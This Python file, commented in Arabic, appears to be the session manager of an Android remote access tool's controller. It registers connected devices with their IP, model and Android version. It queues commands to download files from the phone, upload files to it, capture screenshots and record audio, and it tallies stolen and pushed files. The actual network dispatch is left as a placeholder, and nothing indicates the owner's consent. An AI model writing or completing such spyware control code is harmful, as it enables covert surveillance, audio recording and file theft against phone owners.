#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
مدير الجلسات المتقدم
Advanced Session Manager
"""

import os
import json
import time
import threading
from datetime import datetime, timedelta
from pathlib import Path
from utils.logger import Logger

class SessionManager:
    """كلاس إدارة الجلسات"""
    
    def __init__(self):
        self.logger = Logger()
        self.sessions = {}
        self.sessions_dir = Path("sessions")
        self.sessions_dir.mkdir(exist_ok=True)
        self.stats = {
            'total_sessions': 0,
            'active_sessions': 0,
            'total_commands': 0,
            'files_downloaded': 0,
            'files_uploaded': 0,
            'start_time': datetime.now().isoformat()
        }
        self.lock = threading.Lock()
        
    def add_session(self, session):
        """إضافة جلسة جديدة"""
        try:
            with self.lock:
                session_id = session['id']
                self.sessions[session_id] = session
                self.stats['total_sessions'] += 1
                self.stats['active_sessions'] += 1
                
                # حفظ معلومات الجلسة
                self.save_session(session)
                
                self.logger.info(f"تم إضافة جلسة جديدة: {session_id}")
                return True
                
        except Exception as e:
            self.logger.error(f"خطأ في إضافة الجلسة: {e}")
            return False
    
    def update_session(self, session_id, session_data):
        """تحديث معلومات الجلسة"""
        try:
            with self.lock:
                if session_id in self.sessions:
                    self.sessions[session_id].update(session_data)
                    self.save_session(self.sessions[session_id])
                    return True
                else:
                    self.logger.warning(f"الجلسة {session_id} غير موجودة")
                    return False
                    
        except Exception as e:
            self.logger.error(f"خطأ في تحديث الجلسة: {e}")
            return False
    
    def remove_session(self, session_id):
        """إزالة جلسة"""
        try:
            with self.lock:
                if session_id in self.sessions:
                    session = self.sessions[session_id]
                    session['status'] = 'disconnected'
                    session['disconnected_at'] = datetime.now().isoformat()
                    
                    # حفظ الجلسة قبل الحذف
                    self.save_session(session)
                    
                    del self.sessions[session_id]
                    self.stats['active_sessions'] = max(0, self.stats['active_sessions'] - 1)
                    
                    self.logger.info(f"تم إزالة الجلسة: {session_id}")
                    return True
                else:
                    self.logger.warning(f"الجلسة {session_id} غير موجودة")
                    return False
                    
        except Exception as e:
            self.logger.error(f"خطأ في إزالة الجلسة: {e}")
            return False
    
    def get_session(self, session_id):
        """الحصول على جلسة محددة"""
        return self.sessions.get(session_id)
    
    def get_all_sessions(self):
        """الحصول على جميع الجلسات"""
        return list(self.sessions.values())
    
    def get_active_sessions(self):
        """الحصول على الجلسات النشطة فقط"""
        return [s for s in self.sessions.values() if s.get('status') == 'connected']
    
    def save_session(self, session):
        """حفظ معلومات الجلسة في ملف"""
        try:
            session_id = session['id']
            session_file = self.sessions_dir / f"{session_id}.json"
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session, f, indent=2, ensure_ascii=False, default=str)
                
        except Exception as e:
            self.logger.error(f"خطأ في حفظ الجلسة: {e}")
    
    def load_sessions(self):
        """تحميل الجلسات المحفوظة"""
        try:
            for session_file in self.sessions_dir.glob("*.json"):
                with open(session_file, 'r', encoding='utf-8') as f:
                    session = json.load(f)
                    # تحميل الجلسات المنفصلة فقط
                    if session.get('status') != 'connected':
                        self.sessions[session['id']] = session
                        
            self.logger.info(f"تم تحميل {len(self.sessions)} جلسة")
            
        except Exception as e:
            self.logger.error(f"خطأ في تحميل الجلسات: {e}")
    
    def send_command(self, session_id, command):
        """إرسال أمر للجلسة"""
        try:
            session = self.get_session(session_id)
            if not session:
                self.logger.error(f"الجلسة {session_id} غير موجودة")
                return False
            
            if session.get('status') != 'connected':
                self.logger.error(f"الجلسة {session_id} غير متصلة")
                return False
            
            # إرسال الأمر (هذا يتطلب مرجع للـ listener)
            # سيتم تنفيذ هذا في الكود الرئيسي
            self.stats['total_commands'] += 1
            
            self.logger.info(f"تم إرسال الأمر '{command}' للجلسة {session_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"خطأ في إرسال الأمر: {e}")
            return False
    
    def get_device_info(self, session_id):
        """الحصول على معلومات الجهاز"""
        try:
            session = self.get_session(session_id)
            if not session:
                return None
            
            device_info = session.get('device_info', {})
            
            print(f"\n📱 معلومات الجهاز ({session_id}):")
            print(f"   IP: {session.get('ip', 'غير معروف')}")
            print(f"   المنفذ: {session.get('port', 'غير معروف')}")
            print(f"   وقت الاتصال: {session.get('connected_at', 'غير معروف')}")
            print(f"   آخر نشاط: {session.get('last_activity', 'غير معروف')}")
            print(f"   الحالة: {session.get('status', 'غير معروف')}")
            
            if device_info:
                print(f"   النموذج: {device_info.get('model', 'غير معروف')}")
                print(f"   الأندرويد: {device_info.get('android_version', 'غير معروف')}")
                print(f"   SDK: {device_info.get('sdk_version', 'غير معروف')}")
                print(f"   المعمارية: {device_info.get('architecture', 'غير معروف')}")
                print(f"   الذاكرة: {device_info.get('ram', 'غير معروف')} MB")
            
            return device_info
            
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على معلومات الجهاز: {e}")
            return None
    
    def download_file(self, session_id, file_path):
        """تحميل ملف من الجهاز"""
        try:
            session = self.get_session(session_id)
            if not session:
                self.logger.error(f"الجلسة {session_id} غير موجودة")
                return False
            
            # إرسال أمر تحميل الملف
            command = f"download:{file_path}"
            success = self.send_command(session_id, command)
            
            if success:
                self.stats['files_downloaded'] += 1
                self.logger.info(f"تم طلب تحميل الملف: {file_path}")
            
            return success
            
        except Exception as e:
            self.logger.error(f"خطأ في تحميل الملف: {e}")
            return False
    
    def upload_file(self, session_id, file_path):
        """رفع ملف للجهاز"""
        try:
            if not os.path.exists(file_path):
                self.logger.error(f"الملف غير موجود: {file_path}")
                return False
            
            session = self.get_session(session_id)
            if not session:
                self.logger.error(f"الجلسة {session_id} غير موجودة")
                return False
            
            # قراءة الملف
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # إرسال بيانات الملف
            # سيتم تنفيذ هذا في الكود الرئيسي
            self.stats['files_uploaded'] += 1
            
            self.logger.info(f"تم رفع الملف: {file_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"خطأ في رفع الملف: {e}")
            return False
    
    def take_screenshot(self, session_id):
        """التقاط لقطة شاشة"""
        try:
            command = "screenshot"
            success = self.send_command(session_id, command)
            
            if success:
                self.logger.info(f"تم طلب لقطة الشاشة من الجلسة {session_id}")
            
            return success
            
        except Exception as e:
            self.logger.error(f"خطأ في التقاط لقطة الشاشة: {e}")
            return False
    
    def record_audio(self, session_id, duration=10):
        """تسجيل صوت"""
        try:
            command = f"record_audio:{duration}"
            success = self.send_command(session_id, command)
            
            if success:
                self.logger.info(f"تم طلب تسجيل الصوت من الجلسة {session_id}")
            
            return success
            
        except Exception as e:
            self.logger.error(f"خطأ في تسجيل الصوت: {e}")
            return False
    
    def get_statistics(self):
        """الحصول على الإحصائيات"""
        try:
            # تحديث عدد الجلسات النشطة
            self.stats['active_sessions'] = len(self.get_active_sessions())
            
            # حساب مدة التشغيل
            start_time = datetime.fromisoformat(self.stats['start_time'])
            uptime = datetime.now() - start_time
            self.stats['uptime'] = str(uptime).split('.')[0]
            
            return self.stats
            
        except Exception as e:
            self.logger.error(f"خطأ في الحصول على الإحصائيات: {e}")
            return self.stats
    
    def cleanup_old_sessions(self, days=7):
        """تنظيف الجلسات القديمة"""
        try:
            cutoff_date = datetime.now() - timedelta(days=days)
            removed_count = 0
            
            for session_id in list(self.sessions.keys()):
                session = self.sessions[session_id]
                disconnected_at = session.get('disconnected_at')
                
                if disconnected_at:
                    try:
                        session_date = datetime.fromisoformat(disconnected_at)
                        if session_date < cutoff_date:
                            self.remove_session(session_id)
                            removed_count += 1
                    except:
                        pass
            
            self.logger.info(f"تم حذف {removed_count} جلسة قديمة")
            return removed_count
            
        except Exception as e:
            self.logger.error(f"خطأ في تنظيف الجلسات: {e}")
            return 0
    
    def export_sessions(self, output_file):
        """تصدير الجلسات إلى ملف"""
        try:
            sessions_data = {
                'sessions': list(self.sessions.values()),
                'statistics': self.get_statistics(),
                'exported_at': datetime.now().isoformat()
            }
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(sessions_data, f, indent=2, ensure_ascii=False, default=str)
            
            self.logger.info(f"تم تصدير الجلسات إلى: {output_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"خطأ في تصدير الجلسات: {e}")
            return False
    
    def import_sessions(self, input_file):
        """استيراد الجلسات من ملف"""
        try:
            with open(input_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            imported_sessions = data.get('sessions', [])
            imported_count = 0
            
            for session in imported_sessions:
                if session['id'] not in self.sessions:
                    self.sessions[session['id']] = session
                    imported_count += 1
            
            self.logger.info(f"تم استيراد {imported_count} جلسة من: {input_file}")
            return imported_count
            
        except Exception as e:
            self.logger.error(f"خطأ في استيراد الجلسات: {e}")
            return 0
